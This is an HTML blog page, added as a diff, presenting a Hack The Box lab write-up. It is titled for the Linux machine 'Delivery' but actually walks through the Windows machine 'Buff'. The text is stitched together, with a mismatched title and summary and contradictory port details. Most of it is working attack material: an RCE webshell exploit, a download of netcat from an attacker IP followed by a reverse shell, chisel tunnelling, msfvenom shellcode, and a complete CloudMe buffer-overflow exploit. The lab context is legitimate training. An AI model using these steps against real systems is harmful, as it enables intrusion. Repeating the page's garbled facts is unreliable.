@@ -1,0 +1,997 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hack The Box Write-up #2 : delivery - shyhotboy’s blog</title>
+<meta name="description" content="Writeup for Buff, a windows machine provided by HacktheBox.">
+
+
+  <meta name="author" content="Suljot Gjoka">
+  
+  <meta property="article:author" content="Suljot Gjoka">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="pi0x73's blog">
+<meta property="og:title" content="Hack The Box Write-up #6 : Buff">
+<meta property="og:url" content="https://pi0x73.github.io/HackTheBox-Buff/">
+
+
+  <meta property="og:description" content="Writeup for Buff, a windows machine provided by HacktheBox.">
+
+
+
+  <meta property="og:image" content="https://pi0x73.github.io/assets/images/background.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-11-22T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://pi0x73.github.io/HackTheBox-Buff/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "shyhotboy's blog",
+      "url": "https://shyhotboy1.gitlab.io/Portafolio/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="pi0x73's blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          shyhotboy's blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">whoami</a>
+            </li><li class="masthead__menu-item">
+              <a href="/write-ups/">Writeups</a>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/background.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          Hack The Box Write-up #2 : delivery
+
+        
+      </h1>
+      
+        <p class="page__lead">Writeup for delivery, a linux machine provided by HacktheBox.
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+      
+        <p>
+        
+          <a href="https://www.hackthebox.eu/home/machines/profile/263" class="btn btn--light-outline btn--large">Learn More</a>
+        
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="https://pi0x73.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Write-up #2 : delivery</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Jan Báez</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Computer Science Student</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Dominican Republic</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:janmanuelbaez@gmail.com">
+            <meta itemprop="email" content="janmanuelbaez@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+
+      
+
+      
+        <li>
+          <a href="https://github.com/shyhotboy1" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Write-up #6 : Buff">
+    <meta itemprop="description" content="Writeup for Buff, a windows machine provided by HacktheBox.">
+    <meta itemprop="datePublished" content="2020-11-22T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#enumeration">Enumeration</a>
+    <ul>
+      <li><a href="#nmap">nmap</a></li>
+      <li><a href="#webpage">Webpage</a></li>
+      <li><a href="#gaining-a-low-privileged-shell">Gaining a low-privileged shell</a></li>
+      <li><a href="#upgrading-to-a-stable-shell">Upgrading to a stable shell</a></li>
+    </ul>
+  </li>
+  <li><a href="#lateral-movement">Lateral Movement</a>
+    <ul>
+      <li><a href="#tunneling">Tunneling</a></li>
+      <li><a href="#exploiting-the-vulnerable-software">Exploiting the vulnerable software</a></li>
+      <li><a href="#generating-the-shellcode">Generating the shellcode</a></li>
+      <li><a href="#gaining-system-shell">Gaining system-shell</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p><img src="/images/delivery.png" alt="card" /></p>
+
+<h2 id="summary">Summary</h2>
+<p>Delivery is medium linux machine provided by ippsec on hackthebox. 
+We are provided with a vulnerable <strong> miss configuration webapp</strong> for the initial we use OSINT to get some creds out of the web. 
+For root use (<strong>hashcat</strong>) which is a hash cracker.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+<p>Using our very first usual information , which is the machine’s IP (<strong>10.10.10.222</strong>) , we begin to enumerate with a <strong>nmap</strong> scan</p>
+<h3 id="nmap">nmap</h3>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">--min-rate=1000</span> 10.10.10.222
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-22 15:46 CET
+Nmap scan report <span class="k">for </span>10.10.10.222
+Host is up <span class="o">(</span>0.078s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+822/tcp   open  ssh 
+80/tcp   open  http
+8065/tcp open  unknown<span class="o">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
+</span></code></pre></div></div>
+<p>Ports <strong>8080</strong> and port <strong>822/tcp</strong> are they only ones open.</p>
+
+<h3 id="webpage">Webpage</h3>
+
+<p>The website represents somewhat of a fitness page with a login option.</p>
+
+<p><img src="https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/webpage.png" alt="webpage" /></p>
+
+<p>Clicking on <strong>Contact</strong> button reveals useful information.         <br />
+The website has been built using <code class="language-plaintext highlighter-rouge">Gym Management Software 1.0</code></p>
+
+<p><img src="https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/contact.png" alt="contact" /></p>
+
+<h3 id="gaining-a-low-privileged-shell">Gaining a low-privileged shell</h3>
+
+<p>While searching the software on <strong>exploitdb</strong> We find a RCE vulnerability …</p>
+
+<p><img src="https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/exploitdb.png" alt="exploitdb" /></p>
+
+<p>I am going to use the 4th exploit which appears to be an <code class="language-plaintext highlighter-rouge">Unauthenticated Remote Code Execution</code> Vulnerability.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# searchsploit <span class="nt">-m</span> /usr/share/exploitdb/exploits/php/webapps48506.py
+  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/48506
+     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /root/48506.py
+
+
+root@kali:~# python 48506.py http://10.10.10.198:8080/
+            /<span class="se">\</span>
+/vvvvvvvvvvvv <span class="se">\-</span><span class="nt">-------------------------------------</span>,
+<span class="sb">`</span>^^^^^^^^^^^^ /<span class="o">============</span><span class="nv">BOKU</span><span class="o">=====================</span><span class="s2">"
+            </span><span class="se">\/</span><span class="s2">
+
+[+] Successfully connected to webshell.
+C:</span><span class="se">\x</span><span class="s2">ampp</span><span class="se">\h</span><span class="s2">tdocs</span><span class="se">\g</span><span class="s2">ym</span><span class="se">\u</span><span class="s2">pload&gt; whoami
+�PNG
+�
+buff</span><span class="se">\s</span><span class="s2">haun
+</span></code></pre></div></div>
+
+<p>I have gained an initial shell which is somewhat unstable and not very helpful for lateral movement so I’m going to upload netcat and grab myself a stable shell.</p>
+
+<h3 id="upgrading-to-a-stable-shell">Upgrading to a stable shell</h3>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/usr/share/windows-resources/binaries# python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>Using python3 <strong>http.server</strong> I can host a copy of netcat.exe which is located on <code class="language-plaintext highlighter-rouge">/usr/share/windows-binaries/nc.exe</code> on any Kali host.</p>
+
+<p>On the remote machine I can use the following commands to download and execute netcat in order to give myself a reverse shell :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\xampp\htdocs\gym\upload&gt; powershell -c "curl.exe http://10.10.14.127/nc.exe -o netcat.exe" 
+C:\xampp\htdocs\gym\upload&gt; netcat.exe 10.10.14.127 9001 -e cmd.exe
+</code></pre></div></div>
+
+<p>After a while listening , I recieve a reverse shell:</p>
+
+<p><img src="https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/rev.png" alt="rev" /></p>
+
+<h2 id="lateral-movement">Lateral Movement</h2>
+
+<p>While enumerating the box I came across an interesting <strong>.exe</strong> file under <code class="language-plaintext highlighter-rouge">C:\Users\shaun\Downloads</code> :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\shaun\Documents&gt;cd ../Downloads
+cd ../Downloads
+
+C:\Users\shaun\Downloads&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A22D-49F7
+
+ Directory of C:\Users\shaun\Downloads
+
+14/07/2020  12:27    &lt;DIR&gt;          .
+14/07/2020  12:27    &lt;DIR&gt;          ..
+16/06/2020  15:26        17,830,824 CloudMe_1112.exe
+               1 File(s)     17,830,824 bytes
+               2 Dir(s)   9,756,262,400 bytes free
+</code></pre></div></div>
+
+<p>Again , searching the software on <strong>exploitdb</strong> for a possible vulnerability leads to this :</p>
+
+<p><img src="https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/cloudme.png" alt="cloudme" /></p>
+
+<p>By the first view, it seems like a <strong>Buffer Overflow</strong> vulnerability laying on <strong>CloudMe</strong> which should probably be listening on a local port on the machine.</p>
+
+<p>We can confirm that by executing this command :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\shaun\Downloads&gt;netstat -an | findstr "LISTENING"
+
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
+  [...]
+  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING
+  TCP    [::]:135               [::]:0                 LISTENING
+  TCP    [::]:445               [::]:0                 LISTENING
+  [...]
+</code></pre></div></div>
+
+<p>It appears that the vulnerable software is listening under port <strong>8888</strong> on <code class="language-plaintext highlighter-rouge">localhost</code>.</p>
+
+<h3 id="tunneling">Tunneling</h3>
+
+<p>To remotely exploit it, We would need to use a software like <strong>chisel</strong> to forward the port on our own host and be able to start attacking.</p>
+
+<p>I’m going to download chisel.exe from <a href="https://github.com/jpillora/chisel/releases/tag/v1.7.3">here</a> and upload on the target machine the same way I used to download netcat.</p>
+
+<p>You would also need to install <strong>chisel</strong> on your attacking machine by doing so :</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# curl https://i.jpillora.com/chisel! | bash
+</code></pre></div></div>
+<p>To initiate a chisel server and forward the local port on our host I’ll use the following command in kali , where <strong>chisel</strong> will act as a server :</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# chisel server <span class="nt">-p</span> 9999 <span class="nt">--reverse</span>
+2020/11/22 16:57:19 server: Reverse tunnelling enabled
+2020/11/22 16:57:19 server: Fingerprint a63KtuIHgw77NOvEkBiELKD5r+XZqaveL6gaGH1SMdg<span class="o">=</span>
+2020/11/22 16:57:19 server: Listening on http://0.0.0.0:9999
+</code></pre></div></div>
+<p>Next, on the target machine where <strong>chisel</strong> will act as a client I’ll fire the following command :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\xampp\htdocs\gym\upload&gt;chisel.exe client 10.10.14.127:9999 R:8888:127.0.0.1:8888
+2020/11/22 16:07:14 client: Connecting to ws://10.10.14.127:9999
+2020/11/22 16:07:14 client: Fingerprint 3e:9b:22:0a:bc:86:88:37:da:bc:fe:ff:13:89:a9:20
+2020/11/22 16:07:15 client: Connected (Latency 512.4523ms)
+</code></pre></div></div>
+<p>With everything already set-up now, We can try to attack the vulnerable software.</p>
+
+<p>I’m going to use the exploit from <a href="https://www.exploit-db.com/exploits/48389">https://www.exploit-db.com/exploits/48389</a> which requires some modifications such as changing the shellcode in order to match with our listening port and ip.</p>
+
+<h3 id="exploiting-the-vulnerable-software">Exploiting the vulnerable software</h3>
+
+<p>Using <code class="language-plaintext highlighter-rouge">searchsploit -m</code> we can again copy the exploit to a more flexible path :</p>
+
+<p><img src="https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/bof.png" alt="bof" /></p>
+
+<h3 id="generating-the-shellcode">Generating the shellcode</h3>
+
+<p>To generate the shellcode I can use <strong>msfvenom</strong> with the following options:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.127 <span class="nv">LPORT</span><span class="o">=</span>9002 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">0a"</span> <span class="nt">-f</span> python
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1712 bytes
+buf <span class="o">=</span>  b<span class="s2">""</span>
+buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">29"</span>
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p>Lastly, Im going to replace the shellcode in the exploit with the one I just generated.</p>
+
+<p>The final exploit code should look something like this :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
+
+<span class="n">padding1</span>   <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">1052</span>
+<span class="n">EIP</span>        <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xB5\x42\xA8\x68</span><span class="s">"</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET
+</span><span class="n">NOPS</span>       <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">30</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xbb\xc4\x1c\x1b\x3a\xda\xda\xd9\x74\x24\xf4\x5a\x29</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc9\xb1\x52\x31\x5a\x12\x83\xea\xfc\x03\x9e\x12\xf9</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xcf\xe2\xc3\x7f\x2f\x1a\x14\xe0\xb9\xff\x25\x20\xdd</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x74\x15\x90\x95\xd8\x9a\x5b\xfb\xc8\x29\x29\xd4\xff</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x9a\x84\x02\xce\x1b\xb4\x77\x51\x98\xc7\xab\xb1\xa1</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x07\xbe\xb0\xe6\x7a\x33\xe0\xbf\xf1\xe6\x14\xcb\x4c</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x3b\x9f\x87\x41\x3b\x7c\x5f\x63\x6a\xd3\xeb\x3a\xac</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xd2\x38\x37\xe5\xcc\x5d\x72\xbf\x67\x95\x08\x3e\xa1</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe7\xf1\xed\x8c\xc7\x03\xef\xc9\xe0\xfb\x9a\x23\x13</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x81\x9c\xf0\x69\x5d\x28\xe2\xca\x16\x8a\xce\xeb\xfb</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4d\x85\xe0\xb0\x1a\xc1\xe4\x47\xce\x7a\x10\xc3\xf1</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xac\x90\x97\xd5\x68\xf8\x4c\x77\x29\xa4\x23\x88\x29</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x07\x9b\x2c\x22\xaa\xc8\x5c\x69\xa3\x3d\x6d\x91\x33</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x2a\xe6\xe2\x01\xf5\x5c\x6c\x2a\x7e\x7b\x6b\x4d\x55</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x3b\xe3\xb0\x56\x3c\x2a\x77\x02\x6c\x44\x5e\x2b\xe7</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x94\x5f\xfe\xa8\xc4\xcf\x51\x09\xb4\xaf\x01\xe1\xde</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x3f\x7d\x11\xe1\x95\x16\xb8\x18\x7e\x13\x37\x2c\x01</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4b\x45\x30\xde\xa1\xc0\xd6\x4a\xa6\x84\x41\xe3\x5f</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x8d\x19\x92\xa0\x1b\x64\x94\x2b\xa8\x99\x5b\xdc\xc5</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x89\x0c\x2c\x90\xf3\x9b\x33\x0e\x9b\x40\xa1\xd5\x5b</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x0e\xda\x41\x0c\x47\x2c\x98\xd8\x75\x17\x32\xfe\x87</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xc1\x7d\xba\x53\x32\x83\x43\x11\x0e\xa7\x53\xef\x8f</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xe3\x07\xbf\xd9\xbd\xf1\x79\xb0\x0f\xab\xd3\x6f\xc6</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x3b\xa5\x43\xd9\x3d\xaa\x89\xaf\xa1\x1b\x64\xf6\xde</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x94\xe0\xfe\xa7\xc8\x90\x01\x72\x49\xb0\xe3\x56\xa4</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x59\xba\x33\x05\x04\x3d\xee\x4a\x31\xbe\x1a\x33\xc6</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xde\x6f\x36\x82\x58\x9c\x4a\x9b\x0c\xa2\xf9\x9c\x04</span><span class="s">"</span>
+
+<span class="n">overrun</span>    <span class="o">=</span> <span class="sa">b</span><span class="s">"C"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>       
+
+<span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span> 
+
+<span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">exc_value</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="gaining-system-shell">Gaining system-shell</h3>
+
+<p>Im going to save the modified exploit and run it using : 
+<code class="language-plaintext highlighter-rouge">python cloudme_exploit.py</code>.</p>
+
+<p>Before executing remember that we also need to set up a listening port (the same we used while generating a shellcode) , in this case it would be <strong>9002</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/admin.png" alt="admin" /></p>
+
+<p>After executing I recieved a shell as <strong>Administrator</strong> which was pretty much the last step for this box.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#buffer-overflow" class="page__taxonomy-item" rel="tag">buffer-overflow</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cloudme" class="page__taxonomy-item" rel="tag">CloudMe</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cve" class="page__taxonomy-item" rel="tag">cve</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#rce" class="page__taxonomy-item" rel="tag">rce</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-11-22T00:00:00+00:00">November 22, 2020</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
